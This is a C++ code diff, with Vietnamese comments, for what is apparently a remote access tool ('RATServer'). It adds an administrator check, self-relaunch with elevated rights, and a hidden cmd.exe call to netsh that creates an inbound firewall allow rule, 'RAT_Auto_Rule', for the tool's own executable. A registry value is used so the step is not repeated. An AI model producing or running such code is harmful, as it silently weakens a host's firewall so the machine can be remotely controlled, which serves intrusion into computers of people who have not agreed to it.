@@ -143,3 +143,70 @@ void SetupFirewall() {
     // 3. Thực thi lệnh ngầm (Runas để yêu cầu quyền Admin nếu cần, SW_HIDE để không hiện cửa sổ)
     ShellExecuteA(NULL, "runas", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
 }
+
+// [MỚI] Kiểm tra xem tiến trình hiện tại có quyền Admin không
+bool IsRunAsAdmin() {
+    BOOL fIsRunAsAdmin = FALSE;
+    PSID pAdministratorsGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
+        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
+        FreeSid(pAdministratorsGroup);
+    }
+    return fIsRunAsAdmin;
+}
+
+// [MỚI] Logic thông minh: Tự động đòi Admin nếu cần thiết
+// Trả về TRUE nếu mọi thứ đã ổn (hoặc đã xử lý xong)
+// Trả về FALSE nếu đang yêu cầu restart bằng Admin (cần tắt bản hiện tại)
+bool CheckAndSetupFirewall() {
+    // 1. Lấy đường dẫn file EXE hiện tại
+    char path[MAX_PATH];
+    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return true;
+    std::string currentPath = std::string(path);
+
+    // 2. Đọc đường dẫn cũ đã lưu trong Registry
+    HKEY hKey;
+    char savedPath[MAX_PATH] = "";
+    DWORD bufferSize = sizeof(savedPath);
+    bool needUpdate = true;
+
+    // Mở khóa Registry của app (HKCU\Software\RATServer)
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "FirewallPath", NULL, NULL, (LPBYTE)savedPath, &bufferSize) == ERROR_SUCCESS) {
+            // So sánh: Nếu đường dẫn hiện tại GIỐNG đường dẫn đã lưu -> Firewall đã OK
+            if (currentPath == std::string(savedPath)) {
+                needUpdate = false;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+
+    // 3. Nếu không cần update -> Cho qua luôn
+    if (!needUpdate) return true;
+
+    // 4. Nếu cần update (Lần đầu hoặc đổi chỗ) -> Kiểm tra quyền Admin
+    if (IsRunAsAdmin()) {
+        // --- TRƯỜNG HỢP: ĐÃ LÀ ADMIN ---
+        // a. Chạy lệnh mở Firewall (Code cũ của bạn)
+        std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & ";
+        cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + currentPath + "\" enable=yes";
+        ShellExecuteA(NULL, "open", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
+
+        // b. Lưu đường dẫn mới vào Registry để lần sau không hỏi nữa
+        if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "FirewallPath", 0, REG_SZ, (const BYTE*)currentPath.c_str(), currentPath.length() + 1);
+            RegCloseKey(hKey);
+        }
+
+        return true; // Đã xử lý xong, chạy tiếp
+    }
+    else {
+        // --- TRƯỜNG HỢP: CHƯA LÀ ADMIN ---
+        // Yêu cầu Windows chạy lại chính file này với quyền Admin ("runas")
+        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
+        return false; // Báo cho main() biết để tự tắt bản user này đi
+    }
+}
